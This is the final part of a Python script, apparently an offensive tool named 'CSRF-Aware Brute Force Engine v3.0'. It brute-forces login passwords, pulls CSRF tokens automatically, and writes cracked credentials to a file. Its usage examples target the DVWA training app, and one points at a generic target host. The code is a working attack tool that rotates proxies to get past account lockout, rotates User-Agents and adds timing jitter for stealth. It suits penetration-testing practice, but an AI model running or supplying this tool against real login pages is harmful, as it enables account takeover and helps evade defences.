                            print(f"  {C.BMAGENTA}[PROXY]{C.RST} Rotating → {C.CYAN}{proxy_pool.current}{C.RST}")
                        session = init_session(
                            login_url, proxy_dict=proxy_pool.get_proxy_dict(),
                            cookies=cookies, security_level=security_level,
                            dvwa_auto=False, verbose=verbose
                        )

                if verbose:
                    print(f"  {C.DIM}[STEP 7] Reset → next iteration{C.RST}")

            except KeyboardInterrupt:
                break

            except ValueError as e:
                elapsed_ms = (time.time() - attempt_start) * 1000
                _results_cache.record_attempt(
                    password=password, success=False,
                    status_code=0, elapsed_ms=elapsed_ms
                )
                print(f"  {C.YELLOW}[!]{C.RST} Token error: {e}")
                if proxy_pool and proxy_pool.is_active:
                    proxy_pool.mark_dead()
                    session = init_session(
                        login_url, proxy_dict=proxy_pool.get_proxy_dict(),
                        cookies=cookies, security_level=security_level,
                        dvwa_auto=False, verbose=verbose
                    )
                else:
                    session = init_session(
                        login_url, proxy=proxy, cookies=cookies,
                        security_level=security_level,
                        dvwa_auto=False, verbose=verbose
                    )
                continue

            except requests.RequestException as e:
                elapsed_ms = (time.time() - attempt_start) * 1000
                _results_cache.record_attempt(
                    password=password, success=False,
                    status_code=0, elapsed_ms=elapsed_ms
                )
                if verbose:
                    print(f"  {C.YELLOW}[!]{C.RST} Network error: {e}")
                if proxy_pool and proxy_pool.is_active:
                    proxy_pool.mark_dead()
                    if proxy_pool.alive_count > 0:
                        print(f"  {C.BMAGENTA}[PROXY]{C.RST} Dead proxy removed, {proxy_pool.alive_count} remaining")
                        session = init_session(
                            login_url, proxy_dict=proxy_pool.get_proxy_dict(),
                            cookies=cookies, security_level=security_level,
                            dvwa_auto=False, verbose=verbose
                        )
                    else:
                        print(f"  {C.BRED}[!]{C.RST} All proxies exhausted")
                else:
                    time.sleep(5)
                continue

    except KeyboardInterrupt:
        pass

    _results_cache.print_summary()
    signal.signal(signal.SIGINT, original_handler)
    return cracked_password


# ============================================================================
# CLI
# ============================================================================
def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="CSRF-Aware Brute Force Engine v3.0 — DVWA Level-Aware",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
DVWA Level Commands:
  # LOW — No protection, basic brute-force
  python3 csrf_brute.py -t http://127.0.0.1:4280/vulnerabilities/brute/ -u admin -w wordlists/sample.txt -s low

  # MEDIUM — Server-side sleep(2), same as Low but slower
  python3 csrf_brute.py -t http://127.0.0.1:4280/vulnerabilities/brute/ -u admin -w wordlists/sample.txt -s medium

  # HIGH — CSRF token + random sleep, token auto-handled
  python3 csrf_brute.py -t http://127.0.0.1:4280/vulnerabilities/brute/ -u admin -w wordlists/sample.txt -s high

  # IMPOSSIBLE — Account lockout, brute-force is the WRONG vector
  python3 csrf_brute.py -t http://127.0.0.1:4280/vulnerabilities/brute/ -u admin -w wordlists/sample.txt -s impossible

Other Examples:
  # With browser cookies
  python3 csrf_brute.py -t http://target/vulnerabilities/brute/ -u admin -w wordlists/sample.txt \\
      --cookie "PHPSESSID=abc123; security=high"

  # Fast jitter (less stealthy)
  python3 csrf_brute.py -t http://127.0.0.1:4280/vulnerabilities/brute/ -u admin -w wordlists/sample.txt \\
      -s low --jitter-min 0.1 --jitter-max 0.3

  # With Burp Suite proxy
  python3 csrf_brute.py -t http://127.0.0.1:4280/vulnerabilities/brute/ -u admin -w wordlists/sample.txt \\
      -s high --proxy http://127.0.0.1:8080 -v
        """
    )

    parser.add_argument("-t", "--target", required=True,
        help="Full target URL (e.g., http://127.0.0.1:4280/vulnerabilities/brute/)")
    parser.add_argument("-u", "--username", required=True,
        help="Target username")
    parser.add_argument("-w", "--wordlist", required=True,
        help="Path to password wordlist")
    parser.add_argument("-s", "--security",
        choices=["low", "medium", "high", "impossible"],
        help="DVWA security level (auto-configures method, token, cookies)")
    parser.add_argument("-m", "--method", choices=["GET", "POST"],
        help="Override HTTP method (auto-detected from --security if set)")
    parser.add_argument("--token-name", default="user_token",
        help="CSRF token field name (default: user_token)")
    parser.add_argument("--no-token", action="store_true",
        help="Skip CSRF token extraction (for forms without tokens)")
    parser.add_argument("--failure", default=DVWA_FAILURE_STRING,
        help=f'Failure string (default: "{DVWA_FAILURE_STRING}")')
    parser.add_argument("--success", default=DVWA_SUCCESS_STRING,
        help=f'Success string (default: "{DVWA_SUCCESS_STRING}")')
    parser.add_argument("--jitter-min", type=float, default=0.5,
        help="Min jitter delay seconds (default: 0.5)")
    parser.add_argument("--jitter-max", type=float, default=2.0,
        help="Max jitter delay seconds (default: 2.0)")
    parser.add_argument("--no-ua-rotate", action="store_true",
        help="Disable User-Agent rotation")
    parser.add_argument("-c", "--cookie",
        help='Inject browser cookies (e.g., "PHPSESSID=abc123; security=low")')
    parser.add_argument("--proxy",
        help="Single HTTP proxy (e.g., http://127.0.0.1:8080)")
    parser.add_argument("--proxy-list",
        help="Proxy list file for rotation (lockout bypass)")
    parser.add_argument("--lockout-after", type=int, default=2,
        help="Rotate proxy after N attempts (default: 2)")
    parser.add_argument("-o", "--output",
        help="Output file for cracked credentials")
    parser.add_argument("-v", "--verbose", action="store_true",
        help="Show all step-level debug output")

    return parser.parse_args()


def main():
    args = parse_args()

    # Determine token requirement
    has_token = None
    if args.no_token:
        has_token = False
    # --security preset will set has_token if still None

    result = run_attack(
        target_url=args.target,
        username=args.username,
        wordlist_path=args.wordlist,
        method=args.method,
        token_name=args.token_name,
        has_token=has_token,
        failure_string=args.failure,
        success_string=args.success,
        jitter_range=(args.jitter_min, args.jitter_max),
        rotate_ua=not args.no_ua_rotate,
        proxy=args.proxy,
        proxy_file=args.proxy_list,
        lockout_threshold=args.lockout_after,
        cookies=args.cookie,
        security_level=args.security,
        verbose=args.verbose,
        output_file=args.output,
    )

    sys.exit(0 if result else 1)


if __name__ == "__main__":
    main()
